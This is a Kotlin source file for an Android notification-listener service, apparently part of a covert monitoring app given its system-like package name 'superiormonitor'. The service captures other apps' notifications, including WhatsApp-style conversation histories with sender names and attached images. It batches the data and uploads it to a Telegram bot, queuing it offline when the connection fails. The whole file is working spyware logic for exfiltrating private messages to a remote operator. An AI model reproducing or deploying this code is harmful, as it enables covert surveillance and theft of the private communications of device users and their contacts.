package com.system.superiormonitor.core

import android.content.Context
import android.graphics.Bitmap
import android.os.Bundle
import android.os.Parcelable
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.system.superiormonitor.bot.BotMessages
import com.system.superiormonitor.bot.MediaUploader
import com.system.superiormonitor.bot.OfflineManager
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Objects

class MonitorNotificationListenerService : NotificationListenerService() {
    private val scope = CoroutineScope(Dispatchers.Default)
    private val dateFormat = SimpleDateFormat("HH:mm:ss | dd/MM/yy", Locale.getDefault())
    
    // For batching (Removed manual queue, now using BatchManager)

    // Deduplication and diffing
    private val lruCache = java.util.LinkedHashMap<Int, Long>(100, 0.75f, true)
    private val lastSeenTextMap = java.util.HashMap<String, String>()

    override fun onListenerConnected() {
        super.onListenerConnected()
        LogManager.log(LogCategory.SYSTEM, "Notification Listener connected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        LogManager.log(LogCategory.SYSTEM, "Notification Listener disconnected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        try {
            if (sbn == null) return
            
            val category = sbn.notification.category
            if (category == android.app.Notification.CATEGORY_PROGRESS || 
                category == android.app.Notification.CATEGORY_SYSTEM ||
                category == android.app.Notification.CATEGORY_SERVICE ||
                category == android.app.Notification.CATEGORY_TRANSPORT ||
                category == android.app.Notification.CATEGORY_ERROR) {
                return
            }

            val flags = sbn.notification.flags
            if ((flags and android.app.Notification.FLAG_ONGOING_EVENT) != 0 ||
                (flags and android.app.Notification.FLAG_FOREGROUND_SERVICE) != 0 ||
                (flags and android.app.Notification.FLAG_GROUP_SUMMARY) != 0) {
                return
            }
            if (sbn.isOngoing) return

            val prefs = PrefsManager.getInstance(this)
            if (!prefs.isServiceEnabled || !prefs.notificationEventsEnabled) return

            val packageName = sbn.packageName ?: return

            // Custom Blacklist Checking
            val blacklist = prefs.notificationBlacklist
            if (blacklist.contains(packageName)) return

            // Smart Social Blocking
            if (prefs.notificationBlockSocialEnabled) {
                if (packageName == "com.whatsapp" && prefs.whatsappUpdatesEnabled) return
                if (packageName == "com.whatsapp.w4b" && prefs.whatsappBusinessUpdatesEnabled) return
                if (packageName == "com.instagram.android" && prefs.instagramEnabled) return
            }

            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
            var rawText = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""

            var fullHistoryText = rawText
            var lastMessageOnly = rawText
            
            // MessagingStyle Parsing
            val template = extras.getString(android.app.Notification.EXTRA_TEMPLATE) ?: ""
            val messages = extras.getParcelableArray(android.app.Notification.EXTRA_MESSAGES)
            val isGroupConversation = extras.getBoolean(android.app.Notification.EXTRA_IS_GROUP_CONVERSATION, false)
            val isMessagingStyle = template.contains("MessagingStyle", ignoreCase = true) || (messages != null && messages.isNotEmpty())
            
            if (isMessagingStyle && messages != null && messages.isNotEmpty()) {
                val sb = StringBuilder()
                var lastFormattedMsg = ""
                for (p in messages) {
                    if (p is Bundle) {
                        val senderPerson = p.getParcelable<android.app.Person>("sender_person")
                        val senderName = senderPerson?.name?.toString()?.trim()
                        var msgText = p.getCharSequence("text")?.toString()?.trim() ?: ""
                        
                        if (msgText.isNotBlank()) {
                            // Strip embedded sender names (e.g., "username: message")
                            val colonIdx = msgText.indexOf(':')
                            if (colonIdx != -1 && colonIdx < 30) {
                                val possiblePrefix = msgText.substring(0, colonIdx).trim()
                                if (senderName != null && (senderName.equals(possiblePrefix, true) || senderName.contains(possiblePrefix, true) || possiblePrefix.contains(senderName, true))) {
                                    msgText = msgText.substring(colonIdx + 1).trim()
                                }
                            }

                            val formattedMsg = if (senderName == null) {
                                "[Me]: $msgText"
                            } else {
                                val isSenderSameAsTitle = title.contains(senderName, ignoreCase = true) || senderName.contains(title, ignoreCase = true)
                                if (!isGroupConversation && isSenderSameAsTitle) {
                                    msgText
                                } else {
                                    if (msgText.startsWith("$senderName:", ignoreCase = true) || msgText.startsWith("[$senderName]", ignoreCase = true)) {
                                        msgText
                                    } else {
                                        "[$senderName]: $msgText"
                                    }
                                }
                            }
                            sb.append(formattedMsg).append("\n")
                            lastFormattedMsg = formattedMsg
                        }
                    }
                }
                if (sb.isNotEmpty()) {
                    fullHistoryText = sb.toString().trim()
                    lastMessageOnly = lastFormattedMsg.trim()
                }
            }

            if (title.trim().isEmpty() && fullHistoryText.isEmpty()) return

            var textToLog = fullHistoryText
            val textDiffKey = "$packageName|$title"
            
            // Smart text diffing
            synchronized(lastSeenTextMap) {
                val lastText = lastSeenTextMap[textDiffKey]
                if (lastText != null && lastText.isNotEmpty()) {
                    if (fullHistoryText.length > lastText.length && fullHistoryText.startsWith(lastText)) {
                        textToLog = fullHistoryText.substring(lastText.length).trim()
                    } else if (fullHistoryText == lastText) {
                        textToLog = "" // Duplicate block
                    }
                } else {
                    // Prevent giant block history dump on first load
                    if (isMessagingStyle) {
                        textToLog = lastMessageOnly
                    }
                }
                lastSeenTextMap[textDiffKey] = fullHistoryText
            }
            if (textToLog.isEmpty()) return

            // Deduplication
            val hashKey = Objects.hash(packageName, title, textToLog)
            synchronized(lruCache) {
                val now = System.currentTimeMillis()
                val lastSeenTime = lruCache[hashKey]
                if (lastSeenTime != null && (now - lastSeenTime) < 60_000L) {
                    return
                }
                lruCache[hashKey] = now
                if (lruCache.size > 100) {
                    val iterator = lruCache.keys.iterator()
                    if (iterator.hasNext()) { iterator.next(); iterator.remove() }
                }
            }

            val pm = packageManager
            val appName = try {
                pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
            } catch (e: Exception) { packageName }

            val time = dateFormat.format(Date(sbn.postTime))
            
            val safeAppName = TelegramApi.escapeMarkdown(appName)
            val safePackageName = TelegramApi.escapeMarkdown(packageName)
            val safeTitle = TelegramApi.escapeMarkdown(title)
            val safeText = TelegramApi.escapeMarkdown(textToLog)

            val formattedMessage = BotMessages.Alerts.buildNotificationMessage(
                safeAppName, safePackageName, safeTitle, safeText, time
            )

            LogManager.log(LogCategory.BASIC_UPDATE, "Intercepted notification from $appName")

            // Image Extraction
            var bitmap: Bitmap? = null
            try {
                bitmap = extras.getParcelable(android.app.Notification.EXTRA_PICTURE) as? Bitmap
                if (bitmap == null) {
                    bitmap = extras.getParcelable(android.app.Notification.EXTRA_LARGE_ICON) as? Bitmap
                }
            } catch (e: Exception) {
                // Ignore Parcelable extraction errors
            }

            if (bitmap != null) {
                // Process image synchronously to avoid holding the Bitmap
                val imgFile = File(cacheDir, "notif_img_${System.currentTimeMillis()}.jpg")
                try {
                    val scaledBitmap = if (bitmap.width > 1920 || bitmap.height > 1920) {
                        val ratio = 1920f / Math.max(bitmap.width, bitmap.height)
                        Bitmap.createScaledBitmap(bitmap, (bitmap.width * ratio).toInt(), (bitmap.height * ratio).toInt(), true)
                    } else bitmap
                    imgFile.outputStream().use { out ->
                        scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
                    }
                    if (scaledBitmap != bitmap) scaledBitmap.recycle()
                } catch (e: Exception) {
                    Log.e("MonitorNotification", "Error saving notification image", e)
                }

                if (imgFile.exists()) {
                    scope.launch(Dispatchers.IO) {
                        val token = prefs.botToken
                        val chatId = prefs.chatId
                        if (LogManager.isTelegramApiReachable.value && token.isNotEmpty() && chatId.isNotEmpty()) {
                            val success = TelegramApi.sendPhoto(token, chatId, imgFile, formattedMessage)
                            if (!success) {
                                OfflineManager.queueOnly(applicationContext, formattedMessage, "notifications", "offline_notifications.txt")
                            }
                        } else {
                            OfflineManager.queueOnly(applicationContext, formattedMessage, "notifications", "offline_notifications.txt")
                        }
                        imgFile.delete()
                    }
                    return // Stop further batching since we handled it as a photo
                }
            }

            com.system.superiormonitor.core.BatchManager.queue("notifications", formattedMessage, 3000L, 25) { batch ->
                processNotificationBatch(batch)
            }
        } catch (e: Exception) {
            Log.e("MonitorNotification", "Error processing notification", e)
        }
    }

    private fun processNotificationBatch(items: List<String>) {

        val prefs = PrefsManager.getInstance(applicationContext)
        val token = prefs.botToken
        val chatId = prefs.chatId

        if (items.size < 3) {
            scope.launch(Dispatchers.IO) {
                for (item in items) {
                    if (LogManager.isTelegramApiReachable.value && token.isNotEmpty() && chatId.isNotEmpty()) {
                        val messageId = TelegramApi.sendMessage(token, chatId, item, "Markdown")
                        if (messageId == null) {
                            OfflineManager.queueOnly(applicationContext, item, "notifications", "offline_notifications.txt")
                        }
                    } else {
                        OfflineManager.queueOnly(applicationContext, item, "notifications", "offline_notifications.txt")
                    }
                    kotlinx.coroutines.delay(1000)
                }
            }
        } else {
            val batchText = items.joinToString("\n\n")
            scope.launch(Dispatchers.IO) {
                try {
                    val batchDir = File(getExternalFilesDir(null), "notifications/batch")
                    if (!batchDir.exists()) batchDir.mkdirs()
                    val batchFile = File(batchDir, "batch_${System.currentTimeMillis()}.txt")
                    batchFile.writeText(batchText)
                    
                    val caption = "#Notifications #Batch\n📦 *Live Batch Upload*\n\n${items.size} notifications arrived rapidly."
                    if (LogManager.isTelegramApiReachable.value && token.isNotEmpty() && chatId.isNotEmpty()) {
                        val success = MediaUploader.uploadDocument(applicationContext, token, chatId, batchFile, "text/plain", caption, null)
                        if (!success) {
                            OfflineManager.queueOnly(applicationContext, batchText, "notifications", "offline_notifications.txt")
                        }
                    } else {
                        OfflineManager.queueOnly(applicationContext, batchText, "notifications", "offline_notifications.txt")
                    }
                    if (batchFile.exists()) batchFile.delete()
                } catch (e: Exception) {
                    OfflineManager.queueOnly(applicationContext, batchText, "notifications", "offline_notifications.txt")
                }
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Notification removed logic placeholder
    }
}
